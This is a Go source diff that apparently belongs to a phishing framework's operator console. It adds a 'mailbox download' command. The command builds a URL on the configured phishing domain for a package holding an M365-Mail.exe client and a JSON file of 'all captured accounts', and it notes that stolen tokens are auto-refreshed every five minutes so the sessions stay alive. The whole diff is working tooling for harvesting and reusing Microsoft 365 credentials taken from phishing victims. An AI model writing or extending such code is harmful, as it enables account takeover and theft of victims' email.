@@ -3383,12 +3383,14 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("refresh", readline.PcItem("all")),
 			readline.PcItem("remove"),
 			readline.PcItem("url"),
+			readline.PcItem("download"),
 			readline.PcItem("stats")))
 
 	h.AddSubCommand("mailbox", nil, "", "list all saved mailbox accounts")
 	h.AddSubCommand("mailbox", []string{"refresh"}, "refresh <id|all>", "force refresh token(s)")
 	h.AddSubCommand("mailbox", []string{"remove"}, "remove <id>", "remove an account")
 	h.AddSubCommand("mailbox", []string{"url"}, "url", "show API endpoint URL")
+	h.AddSubCommand("mailbox", []string{"download"}, "download", "show M365-Mail download URL with all captured accounts")
 	h.AddSubCommand("mailbox", []string{"stats"}, "stats", "show account statistics")
 
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
@@ -4256,6 +4258,29 @@ func (t *Terminal) handleMailbox(args []string) {
 		}
 		apiKey := t.p.tokenFeed.GetAPIKey()
 		log.Info("[mailbox] API URL: https://%s/api/v1/mailbox?key=%s", phishDomain, apiKey)
+	case "download":
+		phishDomain := t.cfg.GetBaseDomain()
+		if phishDomain == "" {
+			log.Error("[mailbox] Please configure your domain first: config domain <your-domain>")
+			return
+		}
+		apiKey := t.p.tokenFeed.GetAPIKey()
+		downloadURL := fmt.Sprintf("https://%s/api/v1/mailbox/download?key=%s", phishDomain, apiKey)
+		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
+		log.Info("[mailbox] M365-Mail Download Package")
+		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
+		log.Info("[mailbox]")
+		log.Info("[mailbox] Download URL:")
+		log.Success("[mailbox]   %s", downloadURL)
+		log.Info("[mailbox]")
+		log.Info("[mailbox] The package contains:")
+		log.Info("[mailbox]   • M365-Mail.exe      - Mail client application")
+		log.Info("[mailbox]   • accounts-import.json - All captured accounts")
+		log.Info("[mailbox]")
+		log.Info("[mailbox] Accounts will auto-import when M365-Mail.exe is launched.")
+		log.Info("[mailbox] Tokens are kept alive with auto-refresh every 5 minutes.")
+		log.Info("[mailbox]")
+		log.Info("[mailbox] Total accounts in package: %d", mailbox.Count())
 	case "stats":
 		total, active, expired, admins := mailbox.GetStats()
 		log.Info("[mailbox] Statistics:")
@@ -4270,6 +4295,7 @@ func (t *Terminal) handleMailbox(args []string) {
 		log.Info("[mailbox]   mailbox refresh all   - Force refresh all accounts")
 		log.Info("[mailbox]   mailbox remove <id>   - Remove an account")
 		log.Info("[mailbox]   mailbox url           - Show API endpoint URL")
+		log.Info("[mailbox]   mailbox download      - Show download URL for M365-Mail package")
 		log.Info("[mailbox]   mailbox stats         - Show statistics")
 	}
 }
